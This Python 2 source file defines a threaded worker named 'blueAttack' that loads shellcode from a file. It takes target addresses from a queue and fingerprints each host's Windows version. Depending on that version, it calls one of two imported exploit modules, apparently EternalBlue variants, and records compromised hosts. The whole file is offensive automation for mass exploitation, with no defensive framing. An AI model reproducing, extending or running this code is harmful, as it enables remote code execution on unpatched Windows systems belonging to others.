#coding=utf-8
import threading
import Queue
import logger
import sys
import checker
import globalFunc
import expblue7
import expblue8 
reload(sys)
c=sys.getdefaultencoding()
sys.setdefaultencoding('utf-8')
'''

'''
class blueAttack(threading.Thread):
    def __init__(self,blueQueue,resultQueue,shellcodePath):
        threading.Thread.__init__(self, name='blueAttack')
        self.resultQueue=resultQueue
        self.blueQueue = blueQueue
        self.shellcodePath = shellcodePath
    def run(self):
        #加载shellcode
        result7 = ''
        result8 = ''
        with open(self.shellcodePath, 'rb') as fp:
            sc = fp.read()
        if len(sc) > 0xe80:
            logger.log.debug('Shellcode too long. The place that this exploit put a shellcode is limited to {} bytes.'.format(0xe80))
        else:
            #fp.close()
            #while结构内，一直监听此端口直到程序结束
            while(True):
              try:
                  #ckItem = self.checkQueue.get(True,1)
                  #writeContent2File("checkReult.txt",str(ckItem))
                  try:
                      item = self.blueQueue.get(True,3)
                  except Exception,ex:
                      break
                  
                  target = item['addr']
                  logger.log.info('blue attack target:%s '%target)
                  try:
                      checkResult = checker.checkVuln(target,'','')
                      server_os = checkResult['OS']
                      if(server_os.startswith("Windows 7 ") or (server_os.startswith("Windows Server ") and ' 2008 ' in server_os) or server_os.startswith("Windows Vista")):
                          result7 = expblue7.exploit(str(target) , sc ,13)
                      elif(server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
                          result8 = expblue8.exploit(str(target) , sc ,13)
                      elif server_os.startswith("Windows 10 "):
                          build = int(server_os.split()[-1])
                          if build >= 14393:
                              result8 = expblue8.exploit(str(target) , sc ,13)
                      else:
                          logger.log.info('blue attack do not support this os:%s'%server_os)
                  except Exception as e:
                      #doorSocket.close()
                      logger.log.warning(str(e))
                  #result7 = expblue7.exploit(target , sc ,13)
                  #result8 = expblue8.exploit(target , sc ,13)
                  if(result7 != ''):
                      self.resultQueue.put(item,True)
                  if(result8 != ''):
                      self.resultQueue.put(item,True)
                 
                  logger.log.info( "\n blueAttack is finished!" )
              except Exception as e:
                  #doorSocket.close()
                  logger.log.warning(str(e))   
             